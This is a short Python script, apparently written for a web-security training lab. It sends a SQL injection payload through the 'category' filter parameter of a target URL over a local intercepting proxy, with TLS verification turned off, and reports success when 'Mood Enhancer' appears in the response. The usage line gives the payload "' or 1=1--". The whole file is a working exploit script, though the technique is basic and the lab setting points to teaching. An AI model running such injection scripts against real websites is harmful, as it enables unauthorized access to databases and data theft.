import requests
import sys
import urllib3

# Desactivar advertencias de seguridad para peticiones HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_sql(url, payload):
    """Intenta explotar una vulnerabilidad SQL en la URL proporcionada."""
    # Parte de la URL susceptible a inyección
    uri = '/filter?category='
    
    try:
        # Realizar la petición al servidor
        response = requests.get(url + uri + payload, verify=False, proxies=proxies)
        
        # Verificar si la respuesta contiene el indicador de éxito
        if "Mood Enhancer" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        # Informar de un error durante la petición
        print(f"Error during requests to {url}: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        # Obtener URL y carga útil de los argumentos del script
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        
        # Ejecutar y verificar la explotación SQL
        if exploit_sql(url, payload):
            print("[+] SQL Injection successful!")
        else:
            print("[-] SQL Injection unsuccessful.")
    except IndexError:
        # Mensaje de error si faltan argumentos
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: {sys.argv[0]} www.example.com \"' or 1=1--\"")
        sys.exit(1)

        